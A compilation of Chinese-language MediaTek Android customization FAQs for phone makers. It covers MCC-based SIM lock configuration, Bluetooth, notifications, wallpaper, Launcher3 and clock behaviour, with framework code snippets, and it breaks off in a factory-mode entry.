
## [锁网]  [SIM ME lock]  [FAQ09894]  [SIM_ME_LOCK] 在锁卡时如何只锁MCC(移动国家码)

```text
根据 MNC 的情况，有两种处理方式：
【方法一】
一个国家一般只有有限几个MCCMNC，比如国内中国移动，中国联通与中国电信三家运营商一共有：46000，46001，46002，46003，46005，46006，46007
我们在锁卡配置时将以上7个MCCMNC 全部配置，就相当于我们锁了MCC 460 的卡。
所以如果客户有这种要求，请要求他们提供该国家MCC下所有MNC，然后全部配置即可。注意，在smart phone 上默认最多锁 10 组MCCMNC，如果超出此个数，请参考： [FAQ14236] 
锁卡配置完成后，请一定 new 编译并全擦下载测试，否则可能会导致死机或者配置不生效。

【方法二】
如果只有 MCC，不确定MNC,  可以只配置MCC，并修改 sml_Check 比较部分的代码；只要比较3位，代码修改为下面即可；
1） 在 sml_Check 中修改只比较前3 位；
修改后(添加红色部分代码)：
for (idx = 0; idx < meta->num; idx++) {
    offset = idx * size_of_cat;
    code_len = sml_GetCode(cat, imsi, gid1, gid2, sim_mnc_len, (pdata+offset), code);
    kal_prompt_trace(MOD_SMU, "[LOCK MCC] : code[0] =%x,code[1] =%x, (*(pdata+offset))=%x, (*(pdata+offset+1))=%x", code[0] ,code[1] ,(*(pdata+offset)),(*(pdata+offset+1)));
    if (size_of_cat == code_len) {
        /* Just lock MCC, e.g.  MCC:460,  MCCMNC=0x46, 0x0F,0xFF */
        /* if ((source == 1) && (cat == SML_CAT_N) && (((*(pdata+offset+1)) & 0x0F) == 0x0F))  */ /*If have slot 0 and slot 1, just lock slot 1*/

        if ((cat == SML_CAT_N) && (((*(pdata+offset+1)) & 0x0F) == 0x0F)) { 
            /*code is from SIM, pdata is from NVRAM, just compare 3 number */
            if ((code[0] ==(*(pdata+offset))) && ((code[1] & 0xF0)==((*(pdata+offset+1))& 0xF0))) {
                kal_prompt_trace(MOD_SMU, "[LOCK MCC] : return true.");
                result = KAL_TRUE;
                break;
            }
        } else if (kal_mem_cmp(code, (pdata+offset), code_len)==0) {
               kal_prompt_trace(MOD_SMU, "[LOCK common] : return true.");
               result = KAL_TRUE;
               break;
        }
    }
}

修改前：
for (idx = 0; idx < meta->num; idx++) {
    offset = idx * size_of_cat;
    code_len = sml_GetCode(cat, imsi, gid1, gid2, sim_mnc_len, (pdata+offset), code);
    if (size_of_cat == code_len) {
        if (kal_mem_cmp(code, (pdata+offset), code_len)==0) {
            result = KAL_TRUE;
            break;
        }
    }
}

2）NVRAM_EF_SML_DEFAULT 中按照正常锁卡参数步骤配置
2.1 set lock state
要配置 SML_CAT_N；
2.2 set lock key
2.3 set lock code
对于只锁 MCC的code，MNC需要设置为 FFF
下面是code 部分举例：
/* Category N code */
{0x71,0x6F,0xFF, /*716*/
0x46,0x00,0x2F, /*46002*/ 
如果验证有任何疑问，需要在修改的代码前后各分支都加trace，同时把 code[0] , code[1] , (*(pdata+offset))), (*(pdata+offset+1)))  的值都打印出来，分析执行情况与预期的差异。
```

## [AT]  [FAQ13063]  [Bluetooth]  [AT Command] 如何在手机端显示蓝牙耳机电量

```text
在 HeadsetStateMachine.java 文件中 processUnknownAt 方法中添加对此AT命令的处理函数
实现此AT命令的处理函数 processAtIphoneaccev(),并在此函数中对此AT命令的参数做解析，并按照电池电量的参数来发出Notification更新状态栏的电量图片信息即可。UI显示部分需自己实现。
在此AT命令处理函数中发出Notification即可在状态栏显示蓝牙耳机电量
```

## [bug]  [FAQ14885]  在文件管理器中无法通过蓝牙分享rar压缩包

```text
在default情况下，Android无法通过蓝牙发送、接收rar文件。(可能是因为没有自带解压工具的原因)
如果需要实现收发rar文件，可依据下面方法进行修改 。

1.
packages/apps/Bluetooth/AndroidManifest.xml 的 activity android:name=".opp.BluetoothOppLauncherActivity"
的android.intent.action.SEND以及android.intent.action.SEND_MULTIPLE中分别加入了
<data android:mimeType="application/rar" />

2.
packages/apps/Bluetooth/src/com/android/bluetooth/opp/Constants.java
public static final String[]  ACCEPTABLE_SHARE_INBOUND_TYPES = new String[] 里
添加了"application/rar"
```

## [FAQ12229]  [Bluetooth]  [Settings] 已配对蓝牙设备重命名，重新配对名字不更新

```text
测试机蓝牙名称A5QP,辅助机蓝牙名称T650w，第一次配对成功后，再取消配对，修改辅助机的蓝牙名称为12345，此时再次配对，发现测试机显示配对T650W成功，而不是配对12345成功。
修改\packages\apps\Bluetooth\src\com\android\bluetooth\btservice\RemoteDevices.java文件：
添加1条语句，位置如下：
void devicePropertyChangedCallback(byte[]  address, int[]  types, byte[]  []  values) {
    switch (type) {
        case AbstractionLayer.BT_PROPERTY_BDNAME:
            device.mName = new String(val);
            device.mAlias = device.mName;        //added MTK
            intent = new Intent(BluetoothDevice.ACTION_NAME_CHANGED);
            ......
            break;
        case AbstractionLayer.BT_PROPERTY_REMOTE_FRIENDLY_NAME:
            break;
    ｝
｝
```

## [FAQ17562]  调用图片或视频文件时没有缩略图显示的原因和解决办法

```text
设置墙纸、编辑邮件或者信息时调用图片或视频文件，最近显示的图片或视频没有缩略图显示，
在选择界面按右上角的选项设置成网格视图，也没有缩略图显示，如下面两幅图所示：

DocumentsUI中没有显示缩略图的原因，需要checkro.config.low_ram这个属性是否为true?
 
用adb shell getprop ro.config.low_ram 即可查看
相关代码在如下位置：
/frameworks/base/packages/DocumentsUI/src/com/android/documentsui/dirlist/DirectoryFragment.java
boolean svelte = am.isLowRamDevice() && (mType == TYPE_RECENT_OPEN);
mIconHelper.setThumbnailsEnabled(!svelte);

am.isLowRamDevice()最终是调用到下面的方法去做做判断
frameworks/base/core/java/android/app/ActivityManager.java
public static boolean isLowRamDeviceStatic() {
    return "true".equals(SystemProperties.get("ro.config.low_ram", "false"));
}
 
如果项目开启了GMO feature，则low_ram的property会被设为true
如何check是否有打开GMO feature?
=>请参考ID: FAQ15139  如何确认项目是否打开GMO feature(LCA)?

若GMO enable，则不显示缩略图为正常现象，这是GMO为了节省memory使用而做的调整，不是一个显示异常的问题。

若GMO disable，却还是不显示缩略图，则需先排查需要通过DocumentsUI来打开图片或视频文件的那个app给这些文件所带的类型，是否有缩略图；
若app(如Gallery)那边就没有，则需app那边先排查，若app里面显示缩略图正常，则需DocumentsUI这边去分析为何不显示缩略图的原因。

何为GMO?要enable还是disable GMO?
关于GMO feature要enable还是disable，是根据项目的RAM/ROM等配置来定，在项目开案的时候，CPM就会宣导GMO feature相关的信息。
若不确定是否要enable或disale GMO feature，以及如何enable和disable的设置方法，都可以咨询CPM，他们会有文档指导如何操作。
```

## [FAQ20133]  VoWifi连接之后，通知栏显示名称客制化

```text
需要将 com.mediatek.ims 修改为运营商名称。 
 
通知里面这个地方的值是由字段"android.substName"来决定，如果没有的话，就使用发送通知的Package的名称。
另外要注意的是，如果设置这个字段，要求发送该通知的应用拥有对应的权限（android.permission.SUBSTITUTE_NOTIFICATION_APP_NAME）。
 
如下修改方法验证可行：
 1. ImsNotificationController.java中所有发送通知的地方，都需要加入extras的参数，也就是下面添加了注释的地方，参考如下：
/vendor/mediatek/proprietary/packages/services/Ims/src/com/mediatek/ims/ImsNotificationController.java
final Bundle extras = new Bundle();//mtk add
extras.putString("android.substName", "运营商名称");//mtk add
Notification noti = new Notification.Builder(mContext)
.setContentTitle(wfcText)
.setContentText(mContext.getResources()
.getString(R.string.wfc_notification_summary))
.setSmallIcon(wfcIcon)
.setTicker(wfcText)
.setOngoing(true)
.addExtras(extras)//mtk add
.build();

2. 添加权限：
/vendor/mediatek/proprietary/packages/services/Ims/AndroidManifest.xml添加如下权限：
<uses-permission android:name="android.permission.SUBSTITUTE_NOTIFICATION_APP_NAME" />
```

## [FAQ20153]  当下载数量多于3个，状态栏下载图标会合并成一个显示

```text
1. 打开Chrome/Browser
2. 下载任意图片，视频或 apk
3. 点击Link下载文件,连续下载3个文件后，在下载第4个文件时，状态栏下载图标会合并成一个显示
 
这个就是google的design
在N上google有新增notification group，第三方APP可以用setGroup去将notification设定到一个group；如果第三方APP没有设定group，那么google design会自动将4个相同的notification设定为一个group，所以会发生此问题

如果这题要修改，那么可以尝试修改 frameworks/base/packages/ExtServices/src/android/ext/services/notification/Ranker.java
这个 source code file 里的 private static final int AUTOBUNDLE_AT_COUNT = 4;就是自动group的number

具体的做判断的地方是在 public void onNotificationPosted(StatusBarNotification sbn) 方法中：
if (notificationsForPackage.size() >= AUTOBUNDLE_AT_COUNT) {
    for (String key : notificationsForPackage) {
        notificationsToBundle.add(key);
    }
}
建议不修改这个design，因为这个design会直接影响到所有第三方APP
```

## [FAQ20045]  设置中的添加语言列表多出XA和XB两种语言

```text
如果不希望在添加语言列表中看到这两种语言可以使用如下方式进行修改：
方法一：
（1）将/frameworks/base/core/res/res/values/locale_config.xml中的：
<item>ar-XB</item> <!-- Right-to-left pseudolocale -->
和
<item>en-XA</item> <!-- Left-to-right pseudolocale -->
移除掉。
（2） /frameworks/base/core/java/com/android/internal/app/LocaleStore.java文件中，
public static void fillCache(Context context)   函数的如下代码都去掉：
/* for (String localeId : LocalePicker.getPseudoLocales()) {
    LocaleInfo li = getLocaleInfo(Locale.forLanguageTag(localeId));
    if (isInDeveloperMode) {
        li.setTranslated(true);
        li.mIsPseudo = true;
        li.mSuggestionFlags |= LocaleInfo.SUGGESTION_TYPE_SIM;
    } else {
        sLocaleCache.remove(li.getId());
    }
}*/
 
方法二：
不需要修改locale_config.xml文件，只需按照如下方式修改代码。
/frameworks/base/core/java/com/android/internal/app/LocaleStore.java文件中，
public static void fillCache(Context context)函数按照如下方式对代码进行屏蔽：
for (String localeId : LocalePicker.getPseudoLocales()) {
LocaleInfo li = getLocaleInfo(Locale.forLanguageTag(localeId));
/* if (isInDeveloperMode) {
li.setTranslated(true);
li.mIsPseudo = true;
li.mSuggestionFlags |= LocaleInfo.SUGGESTION_TYPE_SIM;
} else {*/
sLocaleCache.remove(li.getId());
// }
}
```

## [sysui]  [FAQ19971]  SystemUI的数据类型图标定制

```text
客户需求：
PS注册某一种类型的网络时，插入不同的SIM卡，激活数据连接，显示不同的图标类型。
如，PS注册LTE网络的时候，插入一些运营商的SIM，状态栏和下拉快速设置栏显示“4G”,插入另一些运营商的SIM时，显示为“LTE”。

以"PS注册LTE类型,插入SIM：73211,显示“4G” "举例：

方案一：根据不同的mccmnc配置不同的config文件
frameworks/base/packages/SystemUI/res/values-mcc732-mnc111/config.xml 里面配置“config_show4GForLTE”为true
缺点：由于config配置文件是否被执行到，涉及到编译框架的问题，一旦不生效，很难排查

方案二：
/frameworks/base/packages/SystemUI/src/com/android/systemui/statusbar/policy/MobileSignalController.java mapIconSets()方法：获取SIM卡的mccmnc, 使用mccmnc进行定制
if (mConfig.show4gForLte) {
    mNetworkToIconLookup.put(TelephonyManager.NETWORK_TYPE_LTE, TelephonyIcons.FOUR_G);//显示成“4G”
} else {
    mNetworkToIconLookup.put(TelephonyManager.NETWORK_TYPE_LTE, TelephonyIcons.LTE);//显示成“LTE”
}

注意:以上两种方案适用于M & N 平台
```

## [sysui]  [FAQ17869]  某些应用发送粉色背景的通知

```text
有时用户能在手机上看到下图中粉色背景的通知。这种粉色背景的通知很少见，个别应用才会有。
这种通知背景色是google default design.
以下图为例，这是一条stk notification，在StkAppService.java中launchIdleText(int slotId)中调用NotificationManager.notify()发送。

应用发送的通知其layout最终是引用framework模板：alps\frameworks\base\core\res\res\layout\status_bar_latest_event_content.xml 
<FrameLayout xmlns:android="http://schemas.android.com/apk/res/android"
     android:id="@+id/status_bar_latest_event_content"
     android:layout_width="match_parent"
     android:layout_height="wrap_content"
     android:background="#FFFF00FF"
     ......
这里默认的notification layout背景色FFFF00FF就是图中粉红色。
如果App最终调用该模板且没有重新定制background颜色，通知就是粉红色背景。
 
如果希望修改，不建议直接修改status_bar_latest_event_content.xml.
可以找到发送粉色背景通知的应用，在发送时设置通知背景色：
mPublicNotificationBuilder = new Notification.Builder(context).setColor(r.getColor(com.android.internal.R.color.system_notification_accent_color));
```

## [sysui]  [默认值]  [FAQ12707]  如何修改navigationbar上按键的显示顺序

```text
N上的方案：
在N上，由NavigationBarInflaterView负责NavigationBar的view生成。而下方按钮顺序是由config_navBarLayout来决定。
默认顺序，从左往右为：back,home,recent。对应的配置值为：
<string name="config_navBarLayout">space,back;home;recent,menu_ime</string>

可以按照需求，修改这个顺序，比如下面的顺序就是home，back，recent
<string name="config_navBarLayout">space,home;back;recent,menu_ime</string>

M、L、K上的方案：
Navigation bar的layout定义在Navigation_bar.xml (frameworks\base\packages\systemui\res\layout)下。
三个虚拟按键被包含在android:orientation="horizontal"的LinearLayout中，按照定义顺序默认从左至右依次显示BACK, HOME, RECENT。如需改变三个按钮的排列顺序，只需调整他们在LinearLayout中的定义位置即可。
```

## [FAQ13787]  [WallPaper] 如何去掉系统所有的动态壁纸?

```text
1、请将 alps/device/mediatek/$project/ProjectConfig.mk 中的
MTK_LIVEWALLPAPER_APP = yes
MTK_LIVE_PHOTO_SUPPORT = yes
修改为
MTK_LIVEWALLPAPER_APP = no
MTK_LIVE_PHOTO_SUPPORT = no

2、请查看：
alps/device/mediatek/common/device.mk 
alps/device/mediatek/$platform/device.mk 
alps/device/mediatek/$project/device.mk
alps/build/target/product/full_base.mk
这四只文件中是否有以下code：
PRODUCT_PACKAGES += LiveWallpapers
PRODUCT_PACKAGES += LiveWallpapersPicker
PRODUCT_PACKAGES += MagicSmokeWallpapers
PRODUCT_PACKAGES += VisualizationWallpapers
PRODUCT_PACKAGES += Galaxy4
PRODUCT_PACKAGES += HoloSpiralWallpaper
PRODUCT_PACKAGES += NoiseField
PRODUCT_PACKAGES += PhaseBeam
如果有的话，请全部删除。
 
修改后，请先执行make clean ，然后再重新new整个project 。
```

## [默认值]  [FAQ13630]  [WallPaper] 如何替换系统的默认静态壁纸?

```text
请用目标壁纸替换掉
alps/frameworks/base/core/res/res目录下
drawable-nodpi
drawable-xhpi
drawable-xxhdpi
drawable-xxxhdpi
这四个folder下面的 default_wallpaper。
```

## [默认值]  [FAQ19575]  [WallPaper] 第一次开机只设置主屏幕壁纸，锁屏壁纸也变成桌面壁纸

```text
这是Android N的默认设计，具体请参考WallpaperManagerService的setWallpaper方法，如下：

if (which == FLAG_SYSTEM && mLockWallpaperMap.get(userId) == null) {
    migrateSystemToLockWallpaperLocked(userId);
}
```

## [FAQ17634]  哪些类型的DRM文件可以设置为壁纸?

```text
DRM文件中，只有FL类型的可以设置为壁纸??
什么是FL类型的文件?
```

## [FAQ17560]  [WallPaper] 当前Storage Low时设置壁纸失败

```text
这个是正常现象，WallpaperManagerService.java在设置壁纸时，会先去判断当前是否Storage Low，如果是就return，不会再去设置壁纸。
```

## [FAQ12506]  [WallPaper] 如何实现壁纸不随着workspace的滑动而滑动

```text
在Workspace.java中把调用updateOffset的地方全部注释掉。
```

## [FAQ08968]  [WallPaper] 设置动态壁纸后，手机使用过程中恢复为默认静态壁纸

## [FAQ10982]  [WallPaper] 如何内置多张静态壁纸（图片）到系统中

## [FAQ10958]  [WallPaper] 系统WallPaper图片可以设置成屏幕大小的图吗?

```text
系统默认的Wallpaper图片都是两倍屏宽，主要有2个目的：
1. 壁纸可以随着Launcher Workspace的滑动而滑动；
2. 屏幕横屏时，设置了show wallpaper flag的应用背景可以正常显示。
 
如果将Wallpaper宽高修改为与屏幕宽高相同，就会造成如下隐患：
1. Launcher Workspace的背景会被拉伸，表现不美观；
2. 设置了show wallpaper flag的应用背景在横屏时显示不全（右边会显示黑屏，例如recent界面)。
 
隐患1可以通过修改代码解决（下面的代码就是为了解决隐患1），隐患2也是存在的。因此不建议这样修改。
N/M： 
1. 请在WallpaperUtils.java的getDefaultWallpaperSize方法中，请找到如下代码：
if (res.getConfiguration().smallestScreenWidthDp >= 720) {
   defaultWidth = (int) (maxDim * wallpaperTravelToScreenWidthRatio(maxDim, minDim));
   defaultHeight = maxDim;
} else {
   defaultWidth = Math.max((int) (minDim * WALLPAPER_SCREENS_SPAN), maxDim);
   defaultHeight = maxDim;
}
请先确认代码走哪个分支（这与手机分辨率有关），然后把defaultWidth 和defaultHeight 改为屏幕宽高。修改方法如下（以else分支示例）：
Point realSize = new Point();
windowManager.getDefaultDisplay().getRealSize(realSize);
if (isScreenLarge(res)) {
    defaultWidth = (int) (maxDim * wallpaperTravelToScreenWidthRatio(maxDim, minDim));
    defaultHeight = maxDim;
} else {
    defaultWidth = realSize.x;
    defaultHeight = realSize.y;
}
KK/L：
1. 请在WallpaperCropActivity.java的getDefaultWallpaperSize方法中，请找到如下代码：
if (isScreenLarge(res)) {
    defaultWidth = (int) (maxDim * wallpaperTravelToScreenWidthRatio(maxDim, minDim));
    defaultHeight = maxDim;
} else {
    defaultWidth = Math.max((int) (minDim * WALLPAPER_SCREENS_SPAN), maxDim);
    defaultHeight = maxDim;
}
请先确认代码走哪个分支（这与手机分辨率有关），然后把defaultWidth 和defaultHeight 改为屏幕宽高。修改方法如下（以else分支示例）：
Point realSize = new Point();
windowManager.getDefaultDisplay().getRealSize(realSize);
if (isScreenLarge(res)) {
    defaultWidth = (int) (maxDim * wallpaperTravelToScreenWidthRatio(maxDim, minDim));
    defaultHeight = maxDim;
} else {
    defaultWidth = realSize.x;
    defaultHeight = realSize.y;
}

2. 请找到WallpaperManagerService.java的loadSettingLocked方法，去掉如下代码

if (wallpaper.width < baseSize) {
    wallpaper.width == baseSize;
}
```

## [默认值]  [FAQ04295]  如何客制化Launcher的主菜单图标?

```text
在Launcher上，为了保持手机UI风格的统一，希望把用户自己安装的第三方apk图标或者系统预置的应用图标用特定的图标来显示，如何修改?
1. 请修改AppInfo.java的构造函数，如下：
public AppInfo(Context context, LauncherActivityInfoCompat info, UserHandleCompat user, IconCache iconCache) {
    this.componentName = info.getComponentName();
    this.container = ItemInfo.NO_ID;
    flags = initFlags(info);
    firstInstallTime = info.getFirstInstallTime();
    iconCache.getTitleAndIcon(this, info, true /* useLowResIcon */);
    //mtk add
    if ((info.getApplicationInfo().flags & android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0) {
        this.iconBitmap = Bitmap.createBitmap(72, 72, Bitmap.Config.ARGB_8888);  // 具体方法可以自行决定，这里只是例子
    }
    //mtk add 
    intent = makeLaunchIntent(context, info, user);
    this.user = user;
}

2. 如果是用户安装的第三方app，请修改AllAppsList.java，修改updatePackage方法如下：

AppInfo applicationInfo = findApplicationInfoLocked(info.getComponentName().getPackageName(), user, info.getComponentName().getClassName());
if (applicationInfo == null) {
    add(new AppInfo(context, info, user, mIconCache));
} else {
    mIconCache.getTitleAndIcon(applicationInfo, info, true /* useLowResIcon */);
    //mtk add
    在此处添加修改applicationInfo.iconBitmap的代码（同上）
    //mtk add 
    modified.add(applicationInfo);
}

3. 如果是系统预置的某个应用，请修改IconCache.java文件的cacheLocked方法，将

entry.icon = Utilities.createBadgedIconBitmap(info.getIcon(mIconDpi), info.getUser(), mContext);
修改为客制化的图标
举例如下：
if ("com.android.contacts".equals(componentName.getPackageName())) {
    Drawable drawable = getFullResIcon(mContext.getResources(), R.drawable.ic_hw_allbackup);
    entry.icon = Utilities.createBadgedIconBitmap(drawable, info.getUser(), mContext);
} else {
    entry.icon = Utilities.createBadgedIconBitmap(info.getIcon(mIconDpi), info.getUser(), mContext);
}
PS：72/72表示主菜单Icon的图标大小，color format是ARGB8888。这个设置默认把用户自己安装的apk Icon刷成黑色。createBitmap这个方法有多种重载方式，用户可以根据实际需求，通过方法参数（颜色/bitmap/图片资源id等）来构造自己的主菜单Icon风格。
```

## [sysui]  [FAQ19916]  状态栏显示条纹

```text
这是google default的行为，google 原生机也可以复现
有两个问题导致现在的问题，一是异常情况下MinimizedSockShoadow 被异常画出，而DividerHandleView未被画出，刚好与正常情况相反，二是因为转屏原有DividerView 动画并没有被执行
同时fix这两个问题 都需要在google 原本flow修改比较多的地方。 涉及到google drag multi window divider控制multi window 大小以及DividerView 出现/消失动画流程。
无法做简单修改就可以完成，之前类似的问题我们也尝试过修改，但是有遇到过修改后验证通过了，但是给到客户后，又出现其他比较隐蔽且难fix的问题。导致客户花费更多时间去理清后来的问题。
对于比较复杂的修改，我们综合考虑建议不要去修改这部分的代码，主要是担心出现side effect，反而让客户遇到更多的麻烦
```

## [FAQ12143]  [Clock]  [RTL]  从LTR的系统语言切换为RTL的语言，时钟的Tab和内容不对应

```text
操作步骤：
1.  当前系统语言为中文(LTR),进时钟界面查看
2.  更改系统语言为阿拉伯语(RTL)，进时钟界面查看
实际结果：
时钟tab和内容不对应，如tab显示的是闹钟，页面内容显示的是秒表
 
请贵司找到DeskClock.java文件，将用到getRtlPosition(int position)这个方法的地方，全部替换成直接使用position即可解决问题。
也就是说不需要调用 isRtl() 和 getRtlPosition()方法，直接用position就可以。
```

## [FAQ12998]  [clock]  Alarm Group功能介绍

```text
这个功能主要是考虑到，在日常生活中，手机大部分处于灭屏的suspend状态，有一些应用会通过设置定时时钟的方式唤醒系统(screen仍然保持off)，这些app大多在灭屏状态下对唤醒的时间并不敏感。
为了减少background application透过设置(非)周期性的alarm 来trigger手机wake-up(screen off的状态下)，将这些alarm重新排队到同一个时间发生，减少手机wakup的次数，延长app被唤醒的时间间隔，以达到省电的效果。
目前该feature是binary release的，仅对第三方apk才会起效，而且需要在灭屏后手机sleep后的一段时间后才会起作用。
测试条件：
1、打开MTK_BG_POWER_SAVING_SUPPORT这个feature option
2、打开 设置->电池->后台智能省电 选项。
3、安装第三方apk情况下
4、不连接USB/Charger
5、灭屏后一段时间后才可以起效。

测试时可以通过勾选和不勾选的情况下对比测试电流情况，看看是否有省电效果。
请注意测试时不能连接usb/Charger，而且需要观察的是灭屏后一段时间后的电流效果。

本功能在KK2之后的版本会有支持。
```

## [FAQ11651]  [clock]  闹钟响铃时拔电池，重启手机后，闹钟再次提醒

```text
这是正常现象。
闹钟到时后，会设置为fired 状态，如果由于未知原因而stop了（如拔掉电池），会在下一次系统启动的时候判断自己是不是fired 状态，如果是，那么会再判断是不是已经timeout了（正常情况下，一个闹钟响一定时间后会自动missed掉），如果没有timeout ，那么就启动自己，如果已经timeout了，那么就不会再起了。
如果贵司觉得上述行为不是很好的话，可以自行修改AlarmStateManager.java文件中的 registerInstance 这个方法里面最前面的第二个 if 判断，将
if (instance.mAlarmState == AlarmInstance.FIRED_STATE) 这个判断以及里面的内容注释掉。
鉴于目前设计有更好的用户体验，我司建议保持原始设计。
```

## [FAQ14939]  [clock]  情景模式设置为静音模式，如何修改让闹钟仍然有声音

```text
我司遵循google default design,当情景模式里的打扰为“禁止打扰”时，闹钟响铃不会有铃声和震动；当情景模式为静音时，打扰功能就是设置为“禁止打扰”的，因此闹钟是静音。
若贵司一定要改，可以参考以下解法：
DefaultZenModeHelperExt.java
@PluginImpl(interfaceName = "com.mediatek.common.notification.IZenModeHelperExt")
public class DefaultZenModeHelperExt implements IZenModeHelperExt {
   private static final String TAG = "DefaultZenModeHelperExt";
   @Override
   public boolean customizeMuteAlarm(boolean muteAlarm) {
       Log.d(TAG, "customizeMuteAlarm, muteAlarm = " + muteAlarm);
       muteAlarm = false; //add
       Log.d(TAG, "customizeMuteAlarm, muteAlarm = " + muteAlarm);
       return muteAlarm;
   }
}
```

## [FAQ14094]  [clock]  进入deskclock，background颜色发生变化

```text
这个是google L之后的新design，会根据当前的时间来显示不同的background，可以提升用户体验。
例如很晚的时候就是深色（从蓝色->暗色），比较中午的时候蓝色和进入的颜色一样.

具体的代码：
DeskClock.java # mBackgroundColorChanger # setBackgroundColor().

会对24小时配置24种色彩，然后设置一个起始颜色，设置一个渐变动画切换到对应时间点的。
如果要修改BACKGROUND_SPECTRUM[hourOfDay] 可以采用一种配色。
```

## [log]  [FAQ10862]  [clock]  如何抓取关机闹钟（Poweroff Alarm）相关log?

## [FAQ04293]  [launcher]  如何预置桌面上的应用程序图标、快捷方式图标、窗口小部件或者文件夹?

## [FAQ18449]  [launcher]  Launcher主菜单图标从模糊变清晰

```text
Launcher开机启动或者因为某些原因重启时，进入主菜单，主菜单图标会从模糊变清晰。 

这是Launcher的默认设计，第一次加载主菜单图标时，会先去decode一张low resource icon，然后再解析清晰的图片。
如果不想要这个效果，请按照以下修改：
1、修改AllAppsList.java的updatePackage方法为如下：
// Find enabled activities and add them to the adapter
// Also updates existing activities with new labels/icons
for (final LauncherActivityInfoCompat info : matches) {
    AppInfo applicationInfo = findApplicationInfoLocked(
        info.getComponentName().getPackageName(), user,
        info.getComponentName().getClassName());
    if (applicationInfo == null) {
        add(new AppInfo(context, info, user, mIconCache));
    } else {
        mIconCache.getTitleAndIcon(applicationInfo, info, false /* useLowResIcon */);//mtk modify
        modified.add(applicationInfo);
    }
}

2、修改AppInfo.java：
public AppInfo(Context context, LauncherActivityInfoCompat info, UserHandleCompat user, IconCache iconCache) {
    this.componentName = info.getComponentName();
    this.container = ItemInfo.NO_ID;
    flags = initFlags(info);
    firstInstallTime = info.getFirstInstallTime();
    iconCache.getTitleAndIcon(this, info, false /* useLowResIcon */);//mtk modify
    intent = makeLaunchIntent(context, info, user);
    this.user = user;
}
```

## [FAQ18346]  [launcher]  如何减小桌面的空白区域?

```text
参考“FAQ04350 如何去除Launcher默认的google search bar?”去掉google search bar后，发现桌面上面的空白区域比较大（即下图红框框出来的区域）。要如何修改才能减少空白区域?

请调整DeviceProfile.java的layout(Launcher launcher)方法中Workspace的位置，尽量往上调，即修改如下的代码：
 
// Layout the workspace
PagedView workspace = (PagedView) launcher.findViewById(R.id.workspace);
lp = (FrameLayout.LayoutParams) workspace.getLayoutParams();
lp.gravity = Gravity.CENTER;
Rect padding = getWorkspacePadding(isLayoutRtl);
workspace.setLayoutParams(lp);
workspace.setPadding(padding.left, padding.top, padding.right, padding.bottom);
workspace.setPageSpacing(getWorkspacePageSpacing(isLayoutRtl));
```

## [FAQ13194]  [launcher]  如何去掉Home Sample?

```text
用户要求去掉Launcher3，只使用第三方桌面。但是在去掉Launcher3后系统会多出Home Sample的桌面,请问如何去掉 Home Sample? 
请将alps/build/target/product/core_base.mk中PRODUCT_PACKAGES 这个tag下面的Home项去掉即可。
```

## [FAQ19430]  [launcher]  Launcher是否支持unread feature?

```text
M之前，Launcher支持unread feature。默认只支持电话、短信、邮件、日历，三方App无法支持。
N之后，Unread Feature phase out。
如果您需要此Feature，请自行从M版Merge这个feature，MTK不再支持。因为此feature不仅要Launcher支持，还要Settings/Apps的支持。
```

## [FAQ14512]  [launcher]  Launcher3如何让快捷方式默认创建在第一屏?

```text
Launcher3在收到广播:com.android.launcher.action.INSTALL_SHORTCUT后，会自动在桌面上创建快捷方式，默认会创建在第二屏。如果让快捷方式默认创建在第一屏? 
N/M:
请修改LauncherModel.java的findSpaceForItem方法，将如下代码：
int preferredScreenIndex = workspaceScreens.isEmpty() ? 0 : 1;

修改为：
int preferredScreenIndex=0;

L:
请修改LauncherModel.java的addAndBindAddedWorkspaceApps方法，将如下代码：
int startSearchPageIndex = workspaceScreens.isEmpty() ? 0 : 1;

修改为：
int startSearchPageIndex = 0;
```

## [FAQ11441]  [launcher]  Launcher3中主菜单的布局如何调整(譬如从5*4调整为4*4)?

```text
Launcher3中主菜单的布局如何调整(譬如从5*4调整为4*4)?
N/M:
M版本以后主菜单使用的是RecyclerView，类似于ListView的控件，不支持调整布局。
L:
Launcher3主菜单布局的行数和列数，都是在DynamicGrid.java中动态计算的，xml中无法配置。
如果想修改主菜单的布局，调整行数和列数，请修改DynamicGrid.java中allAppsNumRows和allAppsNumCols的值。
```

## [FAQ08349]  [launcher]  如果Launcher支持横屏显示，如何避免Launcher重新创建?

```text
如果Launcher可以横屏显示，开机时有时会创建两次。有时用户从横屏应用退出回到Launcher时，Launcher也会重新创建。如何避免Launcher重新创建?
[SOLUTION] 
请修改Launcher的AndroidManifest.xml，对Launcher这个Activity添加android:configChanges属性，在这个属性中设置Launcher感兴趣的config变化(例如orientation)。

关于android:configChanges，请参考：
http://developer.android.com/guide/topics/manifest/activity-element.html#config
```

## [FAQ19891]  软件包对于32位和64位的支持情况

```text
请打开软件包对应的ReleaseNote_for_MT6***_alps-mp-**.mp*.xlsx，找到Project_Package_Set_M6***这个sheet，查看右上角的Naming rule change。
Project Naming rule: [MTKomer name]  [chip] _number1number2_M
*Number is meaning in project name
First number means 64 bit SW
Second number means 6M / 5M / 4M / 3M SW
*In 6/5M package set
T means CMCC/TDD(OP01) project
U means CU    /FDD (OP02) project
*Bring "C" to identify that it's C2k/CT(OP09) project
*Bring "G" to identify that it's GMO project
*Bring "WW" to identify that it's WWOP project
/device/mediatek/k35v1_64_tee_vdo/即代表是64bit
64位和32位project不能自行切换，需要和敝司申请对应的project。
```

## [默认值]  [FAQ19897]  how to modify the maximum connections of hotspot from frameworks?

```text
In general,hotspot's maximam connection is limited by hardware,so if you want to modify the number,must to make sure the performance of hardware is enough;

packages/apps/Settings/res_ext/values/mtk_arrays.xml
<string-array name="wifi_ap_max_connection_entries">
    <item>1 user</item>
    <item>2 users</item>
    <item>3 users</item>
    <item>4 users</item>
    <item>5 users</item>
    <item>6 users</item>
    <item>7 users</item>
    <item>8 users</item>
    //add to ten 
    <item>9 users</item>
    <item>10 users</item>
    //add
</string-array>
so you can choose "10 users " when you setup hotspot;
```

## [FAQ11383]  [others] 手动关闭factory mode

```text
为了防止end users在使用手机的过程中由于误操作进入factory mode,需要关闭factory mode.但是在产线流程中factory mode test又是必须存在的，这种情况下，就需要有一个打开或者关闭factory mode的“开关”存在，能够自由的控制factory mode。以72为例，介绍用pro_info来存储这个“开关”标记，这样既可以在LK/Uboot中访问这个标记，同时在上层APK中可以通过nvram的接口来读写设置这个标记。

1.客制化一个nvram item，请参考《customization inNvRAM.ppt》
注意事项_1：
a) 如平台使用的是【eMMC】，新LID对应struct的size必须是512 byte的倍数；
